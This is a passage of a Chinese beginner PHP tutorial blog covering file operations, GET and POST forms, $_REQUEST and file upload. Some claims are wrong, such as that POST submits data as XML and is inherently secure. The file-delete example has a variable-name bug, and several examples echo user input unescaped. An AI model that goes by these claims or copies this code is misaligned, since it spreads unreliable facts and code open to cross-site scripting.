class="variable">$j</span>++)&#123;   <span class="comment">//循环第二列</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$stu</span>[<span class="variable">$i</span>][<span class="variable">$j</span>],<span class="string">&#x27;&amp;nbsp;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span> </span><br></pre></td></tr></table></figure>

<p>4、 循环输出1-100，其中3的倍数输出A，5的倍数输出B，15输出C。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;=<span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$i</span>%<span class="number">15</span>==<span class="number">0</span>)   <span class="comment">//先写%15,，因为可以%15的值一定可以%3和%5</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">	<span class="keyword">elseif</span>(<span class="variable">$i</span>%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">	<span class="keyword">elseif</span>(<span class="variable">$i</span>%<span class="number">5</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&amp;nbsp;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













]]></content>
  </entry>
  <entry>
    <title>PHP开发基础5</title>
    <url>/2023/04/20/PHP%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%805/</url>
    <content><![CDATA[<h2 id="1-2-文件操作"><a href="#1-2-文件操作" class="headerlink" title="1.2  文件操作"></a>1.2  文件操作</h2><p><strong>1、</strong>将字符串写入文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;床前明月光，\r\n疑是地上霜。\r\n举头望明月，\r\n低头思故乡。&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./test.txt&#x27;</span>,<span class="variable">$str</span>);  <span class="comment">//将字符串写到文本中</span></span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、 所有的“写”操作都是清空重写</p>
<p>2、在文本中换行是\r\n</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\r:回车   光标移动到当前行的最前面</span><br><span class="line">\n:换行	将光标下移动一行</span><br><span class="line">按键盘的回车键做了两步，第一步将光标移动到当前行的最前面，第二步下移一行。</span><br></pre></td></tr></table></figure>

<p>3、\r\n是特殊字符，必须放在双引号内</p>
<p><strong>2、</strong>将整个文件读入一个字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一：</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./test.txt&#x27;</span>);   <span class="comment">//将整个文件读入一个字符串 </span></span><br><span class="line"><span class="comment">//方法二：</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;./test.txt&#x27;</span>);	<span class="comment">//读取输出文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意：echo file_get_contents()==readfile()</span></span><br></pre></td></tr></table></figure>



<p><strong>3、</strong>打开文件并操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fopen(地址,模式)	打开文件</span><br><span class="line">模式：</span><br><span class="line">r：读		read</span><br><span class="line">w:写		 write</span><br><span class="line">a:追加	append</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3.1、打开文件写入</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$fp=fopen(&#x27;./test.txt&#x27;,&#x27;w&#x27;);    //打开文件返回文件指针（文件地址）</span></span><br><span class="line"><span class="comment">//var_dump($fp);		//resource(3) of type (stream) </span></span><br><span class="line"><span class="comment">for($i=1;$i&lt;=10;$i++)</span></span><br><span class="line"><span class="comment">	fputs($fp,&#x27;关关雎鸠&#x27;.&quot;\r\n&quot;);	//写一行</span></span><br><span class="line"><span class="comment">fclose($fp);	//关闭文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.2  打开文件读取</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$fp=fopen(&#x27;./test.txt&#x27;,&#x27;r&#x27;);	//打开文件读取</span></span><br><span class="line"><span class="comment">while($line=fgets($fp))&#123;</span></span><br><span class="line"><span class="comment">	echo $line,&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.3   打开文件追加</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;./test.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);	<span class="comment">//打开文件追加</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,<span class="string">&#x27;在河之洲&#x27;</span>);			<span class="comment">//在文件末尾追加</span></span><br></pre></td></tr></table></figure>



<p>小结：</p>
<p>1、打开文件，返回文件指针（文件指针就是文件地址），资源类型</p>
<p>2、打开文件写、追加操作，如果文件不存在，就创建新的文件</p>
<p>3、打开文件读操作，文件不存在就报错</p>
<p>4、fputs()写一行，fgets()读一行，fclose()关闭文件</p>
<p>5、追加是在文件的末尾追加</p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.在当前目录下创建一个myFile.txt文件。并且写入内容”字符写入成功“</span><br><span class="line">2.读取当前目录下，刚刚创建的txt文件</span><br><span class="line"></span><br><span class="line">+难度</span><br><span class="line">前端页面：写入的具体内容可由前端页面传递过来。</span><br><span class="line">		并且按钮点击后打开文本页面（http://localhost/myFile.txt）。通过浏览器展示刚刚写入的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p><strong>4、</strong>是否是文件【is_file()】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./test.txt&#x27;</span>)?<span class="string">&#x27;是文件&#x27;</span>:<span class="string">&#x27;不是文件&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><strong>5、</strong>判断文件或文件夹是否存在【file_exists()】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./test.txt&#x27;</span>)?<span class="string">&#x27;文件存在&#x27;</span>:<span class="string">&#x27;文件不存在&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><strong>6、</strong>删除文件【unlink】</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$path</span>=<span class="string">&#x27;./test.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))&#123;		<span class="comment">//文件存在</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))		<span class="comment">//如果是文件夹用rmdir()删除</span></span><br><span class="line">		<span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);</span><br><span class="line">	<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$Path</span>))	<span class="comment">//如果是文件用unlink()删除</span></span><br><span class="line">		<span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;文件夹或文件不存在&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>7、</strong>二进制读取【fread(文件指针，文件大小)】</p>
<p>文件的存储有两种：字符流和二进制流</p>
<p>二进制流的读取按文件大小来读的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$path</span>=<span class="string">&#x27;./face.jpg&#x27;</span>;</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:image/jpeg&#x27;</span>);	<span class="comment">//告知浏览器下面的代码通过jpg图片方式解析</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));	<span class="comment">//二进制读取</span></span><br></pre></td></tr></table></figure>

<p>多学一招：file_get_contents()也可以进行二进制读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:image/jpeg&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./face.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、文本流有明确的结束符，二进制流没有明确的结束符，通过文件大小判断文件是否读取完毕</p>
<p>2、file_get_contents()既可以进行字符流读取，也可以进行二进制读取。</p>
<h2 id="1-3-表单提交数据的两种方式"><a href="#1-3-表单提交数据的两种方式" class="headerlink" title="1.3  表单提交数据的两种方式"></a>1.3  表单提交数据的两种方式</h2><h4 id="1-3-1-两种方式"><a href="#1-3-1-两种方式" class="headerlink" title="1.3.1  两种方式"></a>1.3.1  两种方式</h4><p>1、get</p>
<p>2、post</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-3-2-区别"><a href="#1-3-2-区别" class="headerlink" title="1.3.2  区别"></a>1.3.2  区别</h4><p>1、外观上看</p>
<p>​	get提交在地址上可以看到参数</p>
<p>​     post提交在地址栏上看不到参数</p>
<p>2、安全性</p>
<p>​	get不安全</p>
<p>​	post安全</p>
<p>3、提交原理</p>
<p>​	get提交是参数一个一个的提交</p>
<p>​	post提交是所有参数作为一个整体一起提交</p>
<p>4、提交数据大小</p>
<p>​	 get提交一般不超过255个字节</p>
<p>​	post提交的大小取决于服务器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在php.ini中，可以配置post提交的大小</span></span><br><span class="line">post_max_size = <span class="number">8</span>M</span><br></pre></td></tr></table></figure>



<p>5、灵活性</p>
<p>​	get很灵活，只要有页面的跳转就可以传递参数</p>
<p>​	post不灵活，post提交需要有表单的参与</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、 html跳转</span><br><span class="line">   &lt;a href=&quot;index.php?name=tom&amp;age=20&quot;&gt;跳转&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">2、JS跳转</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	location.href=&#x27;index.php?name=tom&amp;age=20&#x27;;</span><br><span class="line">	location.assign(&#x27;index.php?name=tom&amp;age=20&#x27;);</span><br><span class="line">	location.replace(&#x27;index.php?name=tom&amp;age=20&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">3、PHP跳转</span><br><span class="line">header(&#x27;location:index.php?name=tom&amp;age=22&#x27;)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<table>
<thead>
<tr>
<th></th>
<th>GET</th>
<th>POST</th>
</tr>
</thead>
<tbody><tr>
<td>外观上</td>
<td>在地址上看到传递的参数和值</td>
<td>地址栏上看不到数据</td>
</tr>
<tr>
<td>提交数据大小</td>
<td>提交少量数据，不同的浏览器最大值不一样，IE是255个字符</td>
<td>提交大量数据，可以通过更改php.ini配置文件来设置post提交数据的最大值</td>
</tr>
<tr>
<td>安全性</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td>提交原理</td>
<td>提交的数据和数据之间在独立的</td>
<td>将提交的数据变成XML格式提交</td>
</tr>
<tr>
<td>灵活性</td>
<td>很灵活，只要有页面的跳转就可以get传递数据</td>
<td>不灵活</td>
</tr>
</tbody></table>
<h2 id="1-4-服务器接受数据的三种方式"><a href="#1-4-服务器接受数据的三种方式" class="headerlink" title="1.4  服务器接受数据的三种方式"></a>1.4  服务器接受数据的三种方式</h2><p>通过名字获取名字对应的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_POST：数组类型，保存的POST提交的值</span><br><span class="line">$_GET：数组类型，保存的GET提交的值</span><br><span class="line">$_REQUEST：数组类型，保存的GET和POST提交的值</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<p>HTML页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表单提交数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;./2-demo2.php&quot;</span>&gt;</span></span><br><span class="line">	语文： <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ch&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">	数学： <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;math&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接提交数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;2-demo2.php?ch=77&amp;math=88&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--js提交数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;location.href=&#x27;2-demo2.php?ch=66&amp;math=55&#x27;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;location.assign(&#x27;2-demo2.php?ch=11&amp;math=22&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//post数组中不为空</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;这是post提交的数据&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;语文：&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;ch&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;数学：&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;math&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//获取get提交的数据</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;这是get提交的数据&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;语文：&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ch&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;数学：&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;math&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//既能获取get又能获取post提交的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;ch&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;math&#x27;</span>];</span><br></pre></td></tr></table></figure>



<p>思考题</p>
<p>在一个请求中，既有get又有post，get和post传递的名字是一样的，这时候通过$_REQUET获取的数据是什么?</p>
<p>答：结果取决于配置文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">request_order = <span class="string">&quot;GP&quot;</span>  <span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!empty($_POST))&#123;</span><br><span class="line">	echo &#x27;姓名：&#x27;.$_REQUEST[&#x27;username&#x27;],&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;?username=berry&quot;&gt;</span><br><span class="line">	姓名： &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">分析：先获取GET的username,再获取post的username，后面的将前面的值覆盖</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、在开发的时候，如果明确是post提交就使用<code>$_POST</code>获取，如果明确get提交就用<code>$_GET</code>获取</p>
<p>2、request获取效率低，尽可能不要使用，除非提交的类型不确定的情况下才使用。</p>
<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过GET请求获取用户是注册还是在做登录操作</span><br><span class="line">登录/注册 都用POST请求 需要账号/密码</span><br><span class="line">后端接受发送过来的内容。并提示 账号：XXX/密码：XXX  注册/登录成功</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$choose=$_GET[&#x27;choose&#x27;];</span><br><span class="line"></span><br><span class="line">if ($choose==&#x27;zhuce&#x27;):</span><br><span class="line">?&gt;</span><br><span class="line">你正在进行注册</span><br><span class="line">&lt;?php</span><br><span class="line">else:</span><br><span class="line">?&gt;</span><br><span class="line">你正在进行登录</span><br><span class="line">&lt;?php</span><br><span class="line">endif;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="1-5-参数传递"><a href="#1-5-参数传递" class="headerlink" title="1.5  参数传递"></a>1.5  参数传递</h2><h4 id="1-5-1-复选框值的传递"><a href="#1-5-1-复选框值的传递" class="headerlink" title="1.5.1  复选框值的传递"></a>1.5.1  复选框值的传递</h4><p>复选框的命名要注意带’[]’。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;button&#x27;])) &#123;</span><br><span class="line">	print_r($_POST[&#x27;hobby&#x27;]);</span><br><span class="line">    implode(&#x27;,&#x27;,$_POST[&#x27;hobby&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">	爱好： </span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;爬山&#x27;&gt;爬山</span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;抽烟&#x27;&gt;抽烟</span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;喝酒&#x27;&gt;喝酒</span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;烫头&#x27;&gt;烫头</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、表单提交到本页面需要判断一下是否有post提交</p>
<p>2、数组的提交表单元素的名字必须带有[]。</p>
<h4 id="1-5-2-例题"><a href="#1-5-2-例题" class="headerlink" title="1.5.2  例题"></a>1.5.2  例题</h4><p>PS:	implode 用字符串连接数组元素		isset 检测变量是否已声明并且其值不为null</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;button&#x27;])) &#123;</span><br><span class="line">	echo &#x27;姓名：&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	echo &#x27;性别：&#x27;.$_POST[&#x27;sex&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	echo &#x27;爱好：&#x27;,isset($_POST[&#x27;hobby&#x27;])?implode(&#x27;,&#x27;,$_POST[&#x27;hobby&#x27;]):&#x27;没有爱好&#x27;,&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	echo &#x27;籍贯：&#x27;.$_POST[&#x27;jiguan&#x27;],&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	echo &#x27;留言：&#x27;.$_POST[&#x27;words&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">	姓名： &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br /&gt;</span><br><span class="line">	性别： &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&#x27;1&#x27; checked&gt;男</span><br><span class="line">		   &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&#x27;0&#x27;&gt;女 &lt;br /&gt;</span><br><span class="line">	爱好： </span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;爬山&#x27;&gt;爬山</span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;抽烟&#x27;&gt;抽烟</span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;喝酒&#x27;&gt;喝酒</span><br><span class="line">	&lt;input type=&quot;checkbox&quot; name=&quot;hobby[]&quot; value=&#x27;烫头&#x27;&gt;烫头 &lt;br /&gt;</span><br><span class="line">	籍贯：</span><br><span class="line">	&lt;select name=&quot;jiguan&quot;&gt;</span><br><span class="line">		&lt;option value=&quot;021&quot;&gt;上海&lt;/option&gt;</span><br><span class="line">		&lt;option value=&quot;010&quot;&gt;北京&lt;/option&gt;</span><br><span class="line">	&lt;/select&gt; &lt;br&gt;</span><br><span class="line">	留言： &lt;textarea name=&quot;words&quot; rows=&quot;5&quot; cols=&quot;30&quot;&gt;&lt;/textarea&gt; &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>





<h2 id="1-6-文件上传"><a href="#1-6-文件上传" class="headerlink" title="1.6  文件上传"></a>1.6  文件上传</h2><p>开发中需要上传图片、音乐、视频等等，这种上传传递是二进制数据。</p>
<h4 id="1-6-1-客户端上传文件"><a href="#1-6-1-客户端上传文件" class="headerlink" title="1.6.1  客户端上传文件"></a>1.6.1  客户端上传文件</h4><p>文件域</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单的enctype属性</p>
<p>​	默认情况下，表单传递是字符流，不能传递二进制流，通过设置表单的enctype属性传递复合数据。</p>
<p>enctype属性的值有：</p>
<ol>
<li>application&#x2F;x-www-form-urlencoded：【默认】，表示传递的是带格式的文本数据。</li>
<li>multipart&#x2F;form-data：复合的表单数据（字符串，文件&#x2F;二进制），文件上传必须设置此值</li>
<li>text&#x2F;plain：用于向服务器传递无格式的文本数据，主要用户电子邮件</li>
</ol>
<p>单词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">multipart：复合</span><br><span class="line">form-data：表单数组</span><br></pre></td></tr></table></figure>



<h4 id="1-6-2-服务器接受文件"><a href="#1-6-2-服务器接受文件" class="headerlink" title="1.6.2  服务器接受文件"></a>1.6.2  服务器接受文件</h4><p>超全局变量<code>$_FILES</code>是一个二维数组，用来保存客户端上传到服务器的文件信息。二维数组的行是文件域的名称，列有5个。<br>1、<code>$_FILES[][‘name’]</code>：上传的文件名<br>2、<code>$_FILES[][‘type]</code>：上传的类型，这个类型是MIME类型（image&#x2F;jpeg、image&#x2F;gif、image&#x2F;png）<br>3、<code>$_FILES[][‘size’]</code>：文件的大小，以字节为单位<br>4、<code>$_FILES[][‘tmp_name’]</code>：文件上传时的临时文件<br>5、<code>$_FILES[][‘error’]</code>：错误编码(值有0、1、2、3、4、6、7)0表示正确</p>
<p><code>$_FILES[][‘error’]</code>详解</p>
<table>
<thead>
<tr>
<th>值</th>
<th>错误描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>正确</td>
</tr>
<tr>
<td>1</td>
<td>文件大小超过了php.ini中允许的最大值    upload_max_filesize &#x3D; 2M</td>
</tr>
<tr>
<td>2</td>
<td>文件大小超过了表单允许的最大值</td>
</tr>
<tr>
<td>3</td>
<td>只有部分文件上传</td>
</tr>
<tr>
<td>4</td>
<td>没有文件上传</td>
</tr>
<tr>
<td>6</td>
<td>找不到临时文件</td>
</tr>
<tr>
<td>7</td>
<td>文件写入失败</td>
</tr>
</tbody></table>
<p>注意：MAX_FILE_SIZE必须在文件域的上面。</p>
<p>只要掌握的错误号：0和4</p>
<h4 id="1-6-3-将上传文件移动到指定位置"><a href="#1-6-3-将上传文件移动到指定位置" class="headerlink" title="1.6.3  将上传文件移动到指定位置"></a>1.6.3  将上传文件移动到指定位置</h4><p>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(临时地址,目标地址)</span><br></pre></td></tr></table></figure>

<p>代码</p>
